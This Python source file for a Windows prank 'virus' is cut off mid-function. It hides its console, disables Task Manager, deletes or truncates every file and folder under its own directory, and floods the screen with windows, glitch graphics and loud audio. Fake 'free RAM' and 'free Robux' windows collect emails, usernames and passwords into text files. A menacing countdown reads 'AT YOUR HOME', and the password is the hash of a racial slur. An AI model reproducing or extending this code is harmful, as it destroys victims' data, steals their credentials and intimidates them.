import os
import sys
import random
import string
import shutil
import threading
import hashlib
import subprocess
import socket
import time
import tkinter as tk
from tkinter import ttk, simpledialog
from PIL import Image, ImageTk, ImageDraw, ImageFont, ImageFilter, ImageEnhance
import pygame
import ctypes
import math
import numpy as np
import winreg

# Hide console window (Windows only)
if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

PASSWORD_HASH = hashlib.sha256("nignig".encode()).hexdigest()
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PROTECTED_FILES = [
    "OIP.png", "dogwhistle.ogg", "nitro.png", "mario.wav", "breathe.mp3",
    "R.png", "ram.png", "iamsorry.png", "nsj.mp3", "jh.wav", "rbx.png"
]
spam_active = True
image_refs = []
PROTECTED_IMAGE = None
NITRO_IMAGE = None
NITRO_CRUSHED_IMAGE = None
RBX_IMAGE = None
BOTNET_PORTS = [50000, 50001, 50002]
BOTNET_IPS = []
ddos_targets = []
ddos_active = False
discord_creds = None
password_window = None
spam_windows = []
glitch_window = None
phase = 0  # 0=normal, 1=tts_hack, 2=mario_windows, 3=final, 4=ram_phish, 5=blast, 6=countdown, 7=crash_notify, 8=robux
mario_windows = []
bytebeat_thread = None
bytebeat_running = False
r_window = None
breathe_process = None
ram_phish_window = None
blast_window = None
blast_extra_active = False
countdown_window = None
nsj_process = None
jh_process = None
crash_window = None
robux_window = None
test_mode = False  # internal flag, not used externally

# ------------------------------------------------------------------
# TERMINAL TESTER (developer console)
# ------------------------------------------------------------------
def terminal_tester():
    """Listen on stdin for commands to jump to different virus phases."""
    global phase, bytebeat_running, spam_active
    print("[TESTER] Type commands: phase0, phase1, phase2, phase3, phase4, phase5, phase6, phase7, phase8, stop")
    while True:
        try:
            cmd = input().strip().lower()
            if cmd == "phase0":
                phase = 0
                spam_active = True
                bytebeat_running = False
                print("-> Switched to PHASE 0 (normal windows)")
            elif cmd == "phase1":
                phase = 1
                spam_active = True
                print("-> Switched to PHASE 1 (TTS + bytebeat + disabled password)")
                threading.Thread(target=tts_speak, args=("test mode phase1", 0.5), daemon=True).start()
                threading.Thread(target=salinewin_bytebeat_loop, args=(1.8, True, False, False), daemon=True).start()
            elif cmd == "phase2":
                phase = 2
                print("-> Switched to PHASE 2 (Mario windows)")
                spawn_mario_windows()
            elif cmd == "phase3":
                phase = 3
                print("-> Switched to PHASE 3 (I KILLED SOMEBODY)")
                show_r_fullscreen()
            elif cmd == "phase4":
                phase = 4
                print("-> Switched to PHASE 4 (RAM phishing with progress bar)")
                show_ram_phishing()
            elif cmd == "phase5":
                phase = 5
                print("-> Switched to PHASE 5 (blast glitch + bytebeat)")
                start_post_ram_blast()
            elif cmd == "phase6":
                phase = 6
                print("-> Switched to PHASE 6 (countdown + iamsorry zoom)")
                start_final_countdown()
            elif cmd == "phase7":
                phase = 7
                print("-> Switched to PHASE 7 (crash notification)")
                show_crash_notification()
            elif cmd == "phase8":
                phase = 8
                print("-> Switched to PHASE 8 (Free Robux phishing)")
                show_robux_phishing()
            elif cmd == "stop":
                print("-> Stopping all virus activity")
                spam_active = False
                bytebeat_running = False
                os._exit(0)
            else:
                print("Unknown command. Available: phase0..phase8, stop")
        except EOFError:
            break
        except:
            pass

# ------------------------------------------------------------------
# EXTREME GLITCH BYTEBEAT FORMULAS
# ------------------------------------------------------------------
def bytebeat_formula_aggressive(t):
    return (((t>>12) ^ t) & 31) * (((t>>6) ^ (t>>10)) & 31)

def bytebeat_formula_profect(t):
    return (t * (t >> 10) << 4) & 255

def bytebeat_formula_multiglitch(t):
    return (10 * ((t >> 6) | t | (t >> (t >> 16))) + (7 & (t >> 11))) & 255

def bytebeat_formula_crushed(t):
    return ((t >> 7) | (t >> 4) | (t >> 2)) & 255

def bytebeat_formula_last(t):
    expr = t * ( (t ^ t) + (t >> 15 | 1) ^ ((t - 1280 ^ t) >> 10) )
    return expr & 255

def bytebeat_formula_random_cycle(t, seed_offset=0, use_last=False):
    if use_last:
        return bytebeat_formula_last(t + seed_offset)
    selector = (t >> 12) & 3
    if selector == 0:
        return bytebeat_formula_aggressive(t + seed_offset)
    elif selector == 1:
        return bytebeat_formula_profect(t + seed_offset)
    elif selector == 2:
        return bytebeat_formula_multiglitch(t + seed_offset)
    else:
        return bytebeat_formula_crushed(t + seed_offset)

def salinewin_bytebeat_loop(volume_boost=2.0, extra_glitch=True, last_phase=False, randomize=False):
    global bytebeat_running
    bytebeat_running = True
    try:
        pygame.mixer.init(frequency=22050, size=-16, channels=1)
        sample_rate = 22050
        duration = 0.02
        while bytebeat_running and (phase in (1, 5)) and spam_active:
            frames = int(duration * sample_rate)
            t_base = time.time() * 8000
            samples = []
            for i in range(frames):
                t_val = int(t_base + i)
                if last_phase and not randomize:
                    val = bytebeat_formula_last(t_val)
                elif randomize:
                    choice = random.randint(0, 4)
                    if choice == 0:
                        val = bytebeat_formula_aggressive(t_val)
                    elif choice == 1:
                        val = bytebeat_formula_profect(t_val)
                    elif choice == 2:
                        val = bytebeat_formula_multiglitch(t_val)
                    elif choice == 3:
                        val = bytebeat_formula_crushed(t_val)
                    else:
                        val = bytebeat_formula_last(t_val)
                else:
                    if extra_glitch:
                        val = bytebeat_formula_random_cycle(t_val, seed_offset=int(t_val & 0xFF), use_last=False)
                    else:
                        val = bytebeat_formula_aggressive(t_val)
                val = int((val - 128) * volume_boost)
                val = max(-32768, min(32767, val))
                samples.append([val, val])
            if extra_glitch and not last_phase and random.random() < 0.05:
                new_rate = random.choice([11025, 22050, 44100, 16000])
                pygame.mixer.quit()
                pygame.mixer.init(frequency=new_rate, size=-16, channels=1)
                sample_rate = new_rate
            arr = np.array(samples, dtype=np.int16)
            try:
                sound = pygame.sndarray.make_sound(arr)
                sound.play()
            except:
                pass
            time.sleep(duration)
    except:
        pass
    finally:
        bytebeat_running = False

# ------------------------------------------------------------------
# ADDITIONAL VIRUS SHIT
# ------------------------------------------------------------------
def disable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def set_wallpaper_to_r():
    r_path = os.path.join(CURRENT_DIR, "R.png")
    if os.path.exists(r_path):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, r_path, 0)
    else:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "Wallpaper", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, "", 0)
        except:
            pass

def open_many_notepads():
    for _ in range(20):
        subprocess.Popen(['notepad.exe'], shell=True)

def mouse_shake():
    try:
        import win32api, win32con
        for _ in range(100):
            x = random.randint(-10, 10)
            y = random.randint(-10, 10)
            win32api.mouse_event(win32con.MOUSEEVENTF_MOVE, x, y, 0, 0)
            time.sleep(0.01)
    except:
        pass

def flip_screen():
    try:
        subprocess.run(['DisplaySwitch.exe', '/rotate:90'], timeout=1)
    except:
        pass

def keyboard_spam():
    try:
        import ctypes.wintypes
        INPUT_KEYBOARD = 1
        KEYEVENTF_KEYDOWN = 0x0000
        KEYEVENTF_KEYUP = 0x0002
        def press_key(key_code):
            ctypes.windll.user32.keybd_event(key_code, 0, KEYEVENTF_KEYDOWN, 0)
            time.sleep(0.02)
            ctypes.windll.user32.keybd_event(key_code, 0, KEYEVENTF_KEYUP, 0)
        keys = [0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A]  # A-J
        for _ in range(50):
            press_key(random.choice(keys))
    except:
        pass

def spawn_extra_glitch_window():
    win = tk.Toplevel()
    win.attributes('-fullscreen', True, '-topmost', True)
    win.configure(bg='black')
    canvas = tk.Canvas(win, highlightthickness=0, bg='black')
    canvas.pack(fill=tk.BOTH, expand=True)
    def glitch_loop():
        for _ in range(100):
            if phase != 5:
                break
            canvas.delete("all")
            for _ in range(random.randint(20, 100)):
                x1 = random.randint(0, win.winfo_screenwidth())
                y1 = random.randint(0, win.winfo_screenheight())
                x2 = x1 + random.randint(10, 150)
                y2 = y1 + random.randint(10, 150)
                color = random.choice(['red', 'lime', 'magenta', 'cyan', 'white', 'yellow'])
                canvas.create_rectangle(x1, y1, x2, y2, fill=color, outline='')
            time.sleep(0.05)
        try:
            win.destroy()
        except:
            pass
    threading.Thread(target=glitch_loop, daemon=True).start()

def enhance_blast_after_35s():
    global blast_extra_active, bytebeat_thread
    if blast_extra_active:
        return
    blast_extra_active = True
    global bytebeat_running
    bytebeat_running = False
    if bytebeat_thread:
        bytebeat_thread.join(timeout=0.5)
    bytebeat_thread = threading.Thread(target=salinewin_bytebeat_loop, args=(4.0, False, False, True), daemon=True)
    bytebeat_thread.start()
    threading.Thread(target=disable_task_manager, daemon=True).start()
    threading.Thread(target=set_wallpaper_to_r, daemon=True).start()
    threading.Thread(target=open_many_notepads, daemon=True).start()
    threading.Thread(target=mouse_shake, daemon=True).start()
    threading.Thread(target=flip_screen, daemon=True).start()
    threading.Thread(target=keyboard_spam, daemon=True).start()
    for _ in range(10):
        threading.Thread(target=spawn_extra_glitch_window, daemon=True).start()

# ------------------------------------------------------------------
# FINAL COUNTDOWN + CRASH NOTIFICATION + FREE ROBUX
# ------------------------------------------------------------------
def play_jh_wav():
    jh_path = os.path.join(CURRENT_DIR, "jh.wav")
    if not os.path.exists(jh_path):
        return
    try:
        pygame.mixer.init()
        sound = pygame.mixer.Sound(jh_path)
        sound.play()
    except:
        pass

def show_crash_notification():
    global crash_window, phase
    # Create a fake crash dialog
    crash = tk.Toplevel()
    crash.title("System Error")
    crash.geometry("500x300")
    crash.attributes('-topmost', True)
    crash.grab_set()
    # Crash log text
    log_text = tk.Text(crash, bg='white', fg='red', font=("Courier", 10))
    log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    crash_log = """[FATAL] Unhandled exception at 0x77c4f3e2
Access violation writing location 0x00000000
Stack trace:
  ntoskrnl.exe!KeBugCheckEx+0x1a
  win32k.sys!xxxSendMessage+0x4c
  ntdll.dll!RtlUserThreadStart+0x21
Memory dump: 0xDEADBEEF
Process ID: 1337
Thread ID: 420
CRASH REPORT: A critical system component has failed.
Please click OK to attempt recovery or click X to ignore."""
    log_text.insert(tk.END, crash_log)
    log_text.config(state=tk.DISABLED)
    # OK button to open Free Robux
    def on_ok():
        crash.destroy()
        show_robux_phishing()
    ok_btn = tk.Button(crash, text="OK", command=on_ok, bg='red', fg='white', font=("Arial", 12, "bold"))
    ok_btn.pack(pady=10)
    crash.protocol("WM_DELETE_WINDOW", on_ok)  # clicking X also triggers robux
    crash_window = crash

def load_distorted_rbx_image():
    """Load rbx.png with heavy glitch/distortion filters."""
    global RBX_IMAGE
    if RBX_IMAGE is not None:
        return RBX_IMAGE
    img_path = os.path.join(CURRENT_DIR, "rbx.png")
    if not os.path.exists(img_path):
        return None
    img = Image.open(img_path)
    img = img.convert('RGB')
    # Posterize to 16 colors
    img = img.quantize(colors=16).convert('RGB')
    # High contrast
    enhancer = ImageEnhance.Contrast(img)
    img = enhancer.enhance(2.5)
    # Add noise
    pixels = img.load()
    for i in range(img.size[0]):
        for j in range(img.size[1]):
            if random.random() < 0.2:
                pixels[i, j] = (random.randint(0,255), random.randint(0,255), random.randint(0,255))
    # Edge enhancement (crushed)
    img = img.filter(ImageFilter.EDGE_ENHANCE_MORE)
    # Glitch strips (horizontal displacement)
    glitched = Image.new('RGB', img.size)
    strip_height = 12
    for y in range(0, img.size[1], strip_height):
        strip = img.crop((0, y, img.size[0], min(y+strip_height, img.size[1])))
        offset = random.randint(-25, 25)
        glitched.paste(strip, (offset, y))
    # Resize to 150x150
    glitched = glitched.resize((150, 150), Image.Resampling.NEAREST)
    RBX_IMAGE = ImageTk.PhotoImage(glitched)
    image_refs.append(RBX_IMAGE)
    return RBX_IMAGE

def show_robux_phishing():
    global robux_window, phase
    phase = 8
    robux_win = tk.Toplevel()
    robux_win.title("FREE ROBUX")
    robux_win.geometry("450x500")
    robux_win.attributes('-topmost', True)
    robux_win.grab_set()
    rbx_img = load_distorted_rbx_image()
    if rbx_img:
        lbl_rbx = tk.Label(robux_win, image=rbx_img)
        lbl_rbx.pack(pady=10)
        image_refs.append(rbx_img)
    # Gradient text for "FREE FUCKING ROBUX"
    canvas = tk.Canvas(robux_win, width=400, height=60, bg='white', highlightthickness=0)
    canvas.pack(pady=5)
    try:
        font = ImageFont.truetype("arial.ttf", 24)
    except:
        font = ImageFont.load_default()
    start_color = (255, 215, 0)  # gold
    end_color = (255, 140, 0)    # orange
    create_gradient_text(canvas, "FREE FUCKING ROBUX", 20, 10, font, start_color, end_color)
    tk.Label(robux_win, text="Get 100,000 Robux for free!\nEnter your Roblox credentials to claim.", 
             font=("Arial", 10), bg='white').pack(pady=5)
    tk.Label(robux_win, text="Roblox Username:", bg='white').pack(pady=(10,0))
    username_entry = tk.Entry(robux_win, width=30)
    username_entry.pack()
    tk.Label(robux_win, text="Password:", bg='white').pack(pady=(5,0))
    password_entry = tk.Entry(robux_win, show="*", width=30)
    password_entry.pack()
    result_label = tk.Label(robux_win, text="", fg="red", bg='white')
    result_label.pack(pady=5)
    def submit():
        username = username_entry.get()
        pwd = password_entry.get()
        if username and pwd:
            with open(os.path.join(CURRENT_DIR, "robux_creds.txt"), "w") as f:
                f.write(f"Username: {username}\nPassword: {pwd}\n")
            robux_win.destroy()
        else:
            result_label.config(text="Please fill both fields.")
    tk.Button(robux_win, text="Claim Robux", command=submit, bg="gold", fg="black", width=15).pack(pady=20)
    robux_win.protocol("WM_DELETE_WINDOW", lambda: None)
    robux_window = robux_win

def start_final_countdown():
    global phase, countdown_window, nsj_process
    if phase != 5:
        return
    phase = 6
    global bytebeat_running
    bytebeat_running = False
    if bytebeat_thread:
        bytebeat_thread.join(timeout=0.5)
    stop_all_sounds()
    if blast_window:
        try:
            blast_window.destroy()
        except:
            pass
    threading.Thread(target=play_jh_wav, daemon=False).start()
    countdown_win = tk.Toplevel()
    countdown_win.attributes('-fullscreen', True, '-topmost', True)
    countdown_win.configure(bg='black')
    messages = [
        "1 mile from your home",
        "half mile from your home",
        "quarter from your home",
        "500 ft from your home",
        "400 ft from your home",
        "300 ft from your home",
        "200 ft from your home",
        "100 ft from your home",
        "AT YOUR HOME"
    ]
    distance_label = tk.Label(countdown_win, text=messages[0], font=("Arial", 36, "bold"), fg='red', bg='black')
    distance_label.pack(pady=30)
    sorry_path = os.path.join(CURRENT_DIR, "iamsorry.png")
    if not os.path.exists(sorry_path):
        label = tk.Label(countdown_win, text="I'M SORRY", font=("Arial", 72, "bold"), fg='red', bg='black')
        label.pack(expand=True)
        countdown_win.after(10000, lambda: countdown_win.destroy())
        threading.Thread(target=play_nsj_and_crash, daemon=False).start()
        countdown_window = countdown_win
        return
    original_img = Image.open(sorry_path)
    screen_width = countdown_win.winfo_screenwidth()
    screen_height = countdown_win.winfo_screenheight()
    steps = 10
    start_size = 10
    end_size = min(screen_width, screen_height)
    def update_zoom_and_text(step=0):
        if step > steps:
            img_full = original_img.resize((screen_width, screen_height), Image.Resampling.LANCZOS)
            photo_full = ImageTk.PhotoImage(img_full)
            image_refs.append(photo_full)
            label_img.config(image=photo_full)
            label_img.image = photo_full
            distance_label.config(text="")
            threading.Thread(target=play_nsj_and_crash, daemon=False).start()
            return
        if step < len(messages):
            distance_label.config(text=messages[step])
        size = int(start_size + (end_size - start_size) * (step / steps))
        if size < 1:
            size = 1
        img_resized = original_img.resize((size, size), Image.Resampling.LANCZOS)
        photo = ImageTk.PhotoImage(img_resized)
        image_refs.append(photo)
        label_img.config(image=photo)
        label_img.image = photo
        label_img.place(relx=0.5, rely=0.5, anchor='center')
        countdown_win.after(1000, update_zoom_and_text, step + 1)
    label_img = tk.Label(countdown_win, bg='black')
    label_img.place(relx=0.5, rely=0.5, anchor='center')
    update_zoom_and_text(0)
    countdown_window = countdown_win

def play_nsj_and_crash():
    global nsj_process
    nsj_path = os.path.join(CURRENT_DIR, "nsj.mp3")
    if not os.path.exists(nsj_path):
        time.sleep(2)
        root.after(0, show_crash_notification)
        return
    try:
        ffplay_path = shutil.which('ffplay')
        if ffplay_path:
            nsj_process = subprocess.Popen([ffplay_path, '-nodisp', '-autoexit', nsj_path],
                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            nsj_process.wait()
        else:
            pygame.mixer.init()
            pygame.mixer.music.load(nsj_path)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                time.sleep(0.1)
            pygame.mixer.quit()
    except:
        pass
    root.after(0, show_crash_notification)

# ------------------------------------------------------------------
# REST OF THE VIRUS (unchanged but with show_ram_phishing fixed)
# ------------------------------------------------------------------
def load_protected_image():
    global PROTECTED_IMAGE
    if PROTECTED_IMAGE is not None:
        return PROTECTED_IMAGE
    img_path = os.path.join(CURRENT_DIR, "OIP.png")
    if os.path.exists(img_path):
        img = Image.open(img_path)
        img = img.resize((300, 300), Image.Resampling.LANCZOS)
        PROTECTED_IMAGE = ImageTk.PhotoImage(img)
    return PROTECTED_IMAGE

def load_nitro_image():
    global NITRO_IMAGE
    if NITRO_IMAGE is not None:
        return NITRO_IMAGE
    img_path = os.path.join(CURRENT_DIR, "nitro.png")
    if os.path.exists(img_path):
        img = Image.open(img_path)
        img = img.resize((150, 150), Image.Resampling.LANCZOS)
        NITRO_IMAGE = ImageTk.PhotoImage(img)
    return NITRO_IMAGE

def load_ram_image():
    img_path = os.path.join(CURRENT_DIR, "ram.png")
    if os.path.exists(img_path):
        img = Image.open(img_path)
        img = img.resize((200, 200), Image.Resampling.LANCZOS)
        return ImageTk.PhotoImage(img)
    return None

def load_crushed_nitro():
    global NITRO_CRUSHED_IMAGE
    if NITRO_CRUSHED_IMAGE is not None:
        return NITRO_CRUSHED_IMAGE
    img_path = os.path.join(CURRENT_DIR, "nitro.png")
    if not os.path.exists(img_path):
        return None
    img = Image.open(img_path)
    img = img.resize((200, 200), Image.Resampling.NEAREST)
    img = img.convert('RGB')
    img = img.quantize(colors=16).convert('RGB')
    enhancer = ImageEnhance.Contrast(img)
    img = enhancer.enhance(2.0)
    pixels = img.load()
    for i in range(img.size[0]):
        for j in range(img.size[1]):
            if random.random() < 0.1:
                pixels[i, j] = (random.randint(0,255), random.randint(0,255), random.randint(0,255))
    img = img.filter(ImageFilter.EDGE_ENHANCE_MORE)
    glitched = Image.new('RGB', img.size)
    strip_height = 8
    for y in range(0, img.size[1], strip_height):
        strip = img.crop((0, y, img.size[0], min(y+strip_height, img.size[1])))
        offset = random.randint(-15, 15)
        glitched.paste(strip, (offset, y))
    NITRO_CRUSHED_IMAGE = ImageTk.PhotoImage(glitched)
    image_refs.append(NITRO_CRUSHED_IMAGE)
    return NITRO_CRUSHED_IMAGE

def create_gradient_text(canvas, text, x, y, font, start_color, end_color):
    dummy_img = Image.new('RGBA', (1, 1))
    draw = ImageDraw.Draw(dummy_img)
    bbox = draw.textbbox((0, 0), text, font=font)
    text_width = bbox[2] - bbox[0]
    text_height = bbox[3] - bbox[1]
    gradient_img = Image.new('RGBA', (text_width, text_height))
    draw_grad = ImageDraw.Draw(gradient_img)
    for y_pos in range(text_height):
        ratio = y_pos / text_height
        r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
        draw_grad.line([(0, y_pos), (text_width, y_pos)], fill=(r, g, b))
    text_img = Image.new('RGBA', (text_width, text_height), (0,0,0,0))
    draw_text = ImageDraw.Draw(text_img)
    draw_text.text((0, 0), text, font=font, fill=(255,255,255))
    final = Image.composite(gradient_img, text_img, text_img)
    photo = ImageTk.PhotoImage(final)
    image_refs.append(photo)
    canvas.create_image(x, y, image=photo, anchor='nw')
    return photo

def destroy_files():
    for root_dir, dirs, files in os.walk(CURRENT_DIR, topdown=False):
        for file in files:
            if file in PROTECTED_FILES:
                continue
            try:
                file_path = os.path.join(root_dir, file)
                if file_path == os.path.abspath(__file__):
                    continue
                os.chmod(file_path, 0o777)
                with open(file_path, 'wb') as f:
                    f.truncate(0)
                os.remove(file_path)
            except:
                pass
        for dir_name in dirs:
            try:
                dir_path = os.path.join(root_dir, dir_name)
                shutil.rmtree(dir_path, ignore_errors=True)
            except:
                pass

def animate_windows():
    if phase != 0:
        return
    for i, (win, vx, vy) in enumerate(spam_windows):
        try:
            x = win.winfo_x()
            y = win.winfo_y()
            width = win.winfo_width()
            height = win.winfo_height()
            screen_width = win.winfo_screenwidth()
            screen_height = win.winfo_screenheight()
            new_x = x + vx
            new_y = y + vy
            if new_x <= 0:
                new_x = 0
                vx = -vx
            if new_x + width >= screen_width:
                new_x = screen_width - width
                vx = -vx
            if new_y <= 0:
                new_y = 0
                vy = -vy
            if new_y + height >= screen_height:
                new_y = screen_height - height
                vy = -vy
            win.geometry(f"+{new_x}+{new_y}")
            spam_windows[i] = (win, vx, vy)
        except:
            pass
    root.after(50, animate_windows)

def spawn_window():
    if not spam_active or phase != 0:
        return
    win = tk.Toplevel()
    win.title(''.join(random.choices(string.ascii_letters, k=8)))
    win.geometry(f"{random.randint(400,800)}x{random.randint(400,800)}+{random.randint(0,1500)}+{random.randint(0,800)}")
    win.attributes('-topmost', True)
    if password_window:
        password_window.lift()
        password_window.attributes('-topmost', True)
    img = load_protected_image()
    if img:
        label_img = tk.Label(win, image=img)
        label_img.pack(pady=10)
        image_refs.append(img)
    vx = random.choice([-5, -4, -3, 3, 4, 5])
    vy = random.choice([-5, -4, -3, 3, 4, 5])
    spam_windows.append([win, vx, vy])

def spam_windows_loop():
    if spam_active and phase == 0:
        spawn_window()
        root.after(30, spam_windows_loop)

def tts_speak(text, interval):
    powershell_cmd = (
        'Add-Type -AssemblyName System.Speech; '
        '$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
        '$speak.Volume = 100; '
        f'$speak.Speak("{text}")'
    )
    while phase == 1 and spam_active:
        subprocess.run(['powershell', '-Command', powershell_cmd], capture_output=True, shell=True)
        time.sleep(interval)

def disable_password_window():
    global password_window
    if password_window:
        for widget in password_window.winfo_children():
            widget.destroy()
        password_window.configure(bg='black')
        label = tk.Label(password_window, text="TOO LATE", font=("Courier", 24, "bold"), fg='red', bg='black')
        label.pack(expand=True)
        def glitch_text():
            if phase == 1 and password_window:
                colors = ['red', '#ff0000', '#880000', '#ff4444', '#cc0000']
                label.config(fg=random.choice(colors))
                offsets = [-2, 0, 2, 1, -1]
                label.place(x=random.choice(offsets), y=random.choice(offsets))
                root.after(50, glitch_text)
        glitch_text()
        password_window.attributes('-disabled', True)
        password_window.protocol("WM_DELETE_WINDOW", lambda: None)
        password_window.grab_set()

def play_slowed_breathe():
    global breathe_process
    breathe_path = os.path.join(CURRENT_DIR, "breathe.mp3")
    if not os.path.exists(breathe_path):
        return
    try:
        ffplay_path = shutil.which('ffplay')
        if ffplay_path:
            breathe_process = subprocess.Popen([ffplay_path, '-nodisp', '-af', 'atempo=0.33333', '-loop', '0', breathe_path],
                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            pygame.mixer.init()
            pygame.mixer.music.load(breathe_path)
            pygame.mixer.music.play(loops=-1)
    except:
        pass

def stop_all_sounds():
    global breathe_process, nsj_process
    try:
        pygame.mixer.quit()
        pygame.mixer.init()
    except:
        pass
    if breathe_process:
        breathe_process.terminate()
        breathe_process = None
    if nsj_process:
        nsj_process.terminate()
        nsj_process = None

def show_r_fullscreen():
    global r_window
    r_path = os.path.join(CURRENT_DIR, "R.png")
    if not os.path.exists(r_path):
        return
    r_window = tk.Toplevel()
    r_window.attributes('-fullscreen', True, '-topmost', True)
    r_window.configure(bg='black')
    img = Image.open(r_path)
    img = img.convert('L')
    img = img.resize((r_window.winfo_screenwidth(), r_window.winfo_screenheight()), Image.Resampling.NEAREST)
    pixels = img.load()
    for i in range(img.size[0]):
        for j in range(img.size[1]):
            if random.random() < 0.15:
                pixels[i, j] = random.randint(0, 255)
    img = ImageTk.PhotoImage(img)
    image_refs.append(img)
    label_img = tk.Label(r_window, image=img)
    label_img.pack(fill=tk.BOTH, expand=True)
    text_label = tk.Label(r_window, text="I KILLED SOMEBODY.", font=("Arial", 48, "bold"), fg='red', bg='black')
    text_label.place(relx=0.5, rely=0.5, anchor='center')
    def fade_text():
        if phase == 3 and r_window and r_window.winfo_exists():
            alpha = (math.sin(time.time() * 1.5) + 1) / 2
            intensity = int(alpha * 255)
            color = f'#{intensity:02x}0000'
            text_label.config(fg=color)
            root.after(50, fade_text)
    fade_text()
    def glitch_r_text():
        if phase == 3 and r_window and r_window.winfo_exists():
            x_off = random.choice([-3, 0, 3])
            y_off = random.choice([-3, 0, 3])
            text_label.place(relx=0.5 + x_off/100, rely=0.5 + y_off/100, anchor='center')
            root.after(100, glitch_r_text)
    glitch_r_text()
    root.after(45000, show_ram_phishing)

def show_ram_phishing():
    global ram_phish_window, phase
    if phase != 3:
        return
    phase = 4
    if r_window:
        r_window.destroy()
    stop_all_sounds()
    ram_win = tk.Toplevel(root)
    ram_win.title("FREE RAM")
    ram_win.geometry("450x550")
    ram_win.attributes('-topmost', True)
    ram_win.grab_set()
    ram_img = load_ram_image()
    if ram_img:
        lbl_ram = tk.Label(ram_win, image=ram_img)
        lbl_ram.pack(pady=10)
        image_refs.append(ram_img)
    canvas = tk.Canvas(ram_win, width=400, height=60, bg='white', highlightthickness=0)
    canvas.pack(pady=5)
    try:
        font = ImageFont.truetype("arial.ttf", 24)
    except:
        font = ImageFont.load_default()
    start_color = (0, 200, 0)
    end_color = (0, 100, 0)
    create_gradient_text(canvas, "FREE FUCKING RAM", 20, 10, font, start_color, end_color)
    tk.Label(ram_win, text="Your computer is low on RAM. Click below to download more RAM instantly.\nEnter email and password to confirm.", 
             font=("Arial", 10), bg='white').pack(pady=5)
    tk.Label(ram_win, text="Email:", bg='white').pack(pady=(10,0))
    email_entry = tk.Entry(ram_win, width=30)
    email_entry.pack()
    tk.Label(ram_win, text="Password:", bg='white').pack(pady=(5,0))
    pass_entry = tk.Entry(ram_win, show="*", width=30)
    pass_entry.pack()
    result_label = tk.Label(ram_win, text="", fg="red", bg='white')
    result_label.pack(pady=5)
    progress = ttk.Progressbar(ram_win, length=300, mode='determinate')
    progress_label = tk.Label(ram_win, text="", bg='white')
    def submit():
        email = email_entry.get()
        pwd = pass_entry.get()
        if not email or not pwd:
            result_label.config(text="Please fill both fields.")
            return
        with open(os.path.join(CURRENT_DIR, "ram_creds.txt"), "w") as f:
            f.write(f"Email: {email}\nPassword: {pwd}\n")
        email_entry.config(state='disabled')
        pass_entry.config(state='disabled')
        submit_btn.config(state='disabled')
        progress.pack(pady=10)
        progress_label.pack()
        def update_progress(step=0):
            if step >= 100:
                progress_label.config(text="Download complete! Preparing RAM...")
                ram_win.after(1000, lambda: ram_win.destroy())
                root.after(1000, lambda: root.after(10000, start_post_ram_blast))
                return
            progress['value'] = step
            progress_label.config(text=f"Downloading RAM... {step}%")
            ram_win.after(50, update_progress, step + 1)
        update_progress()
    submit_btn = tk.Button(ram_win, text="Download RAM", command=submit, bg="green", fg="white", width=15, relief='raised', font=("Arial", 10, "bold"))
    submit_btn.pack(pady=20)
    ram_win.protocol("WM_DELETE_WINDOW", lambda: None)
    ram_phish_window = ram_win

def start_post_ram_blast():
    global phase, bytebeat_thread, blast_window
    phase = 5
    stop_all_sounds()
    bytebeat_thread = threading.Thread(target=salinewin_bytebeat_loop, args=(4.0, False, True, False), daemon=True)
    bytebeat_thread.start()
    blast_win = tk.Toplevel()
    blast_win.attributes('-fullscreen', True, '-topmost', True)
    blast_win.configure(bg='black')
    blast_canvas = tk.Canvas(blast_win, highlightthickness=0, bg='black')
    blast_canvas.pack(fill=tk.BOTH, expand=True)
    def blast_glitch():
        if phase == 5 and blast_win.winfo_exists():
            for _ in range(random.randint(50, 300)):
                x1 = random.randint(0, blast_win.winfo_screenwidth())
                y1 = random.randint(0, blast_win.winfo_screenheight())
                x2 = x1 + random.randint(5, 150)
                y2 = y1 + random.randint(5, 150)
                color = random.choice(['red', 'lime', 'magenta', 'cyan', 'white', '#ff00ff', '#00ffff'])
                blast_canvas.create_rectangle(x1, y1, x2, y2, fill=color, outline='')
            strip_height = random.randint(2, 20)
            for y in range(0, blast_win.winfo_screenheight(), strip_height):
                color = random.choice(['red', 'lime', 'blue', 'yellow'])
                blast_canvas.create_rectangle(0, y, blast_win.winfo_screenwidth(), y+strip_height, fill=color, stipple='gray50')
            if random.random() < 0.05:
                blast_canvas.config(bg=random.choice(['black', 'darkred', 'darkgreen']))
            root.after(20, blast_glitch)
    blast_glitch()
    blast_window = blast_win
    root.after(35000, enhance_blast_after_35s)
    root.after(45000, start_final_countdown)

def spawn_mario_windows():
    global phase
    if phase != 2:
        return
    for win, _, _ in spam_windows:
        try:
            win.destroy()
        except:
            pass
    spam_windows.clear()
    audio_path = os.path.join(CURRENT_DIR, "mario.wav")
    crushed_img = load_crushed_nitro()
    if not os.path.exists(audio_path):
        return
    for _ in range(30):
        win = tk.Toplevel()
        win.title("FREE NITRO")
        win.geometry(f"{random.randint(350,550)}x{random.randint(350,550)}+{random.randint(0,1500)}+{random.randint(0,800)}")
        win.attributes('-topmost', True)
        if crushed_img:
            label_img = tk.Label(win, image=crushed_img)
            label_img.pack(pady=10)
            image_refs.append(crushed_img)
        label = tk.Label(win, text="FREE FUCKING NITRO", font=("Arial", 18, "bold"), fg="red")
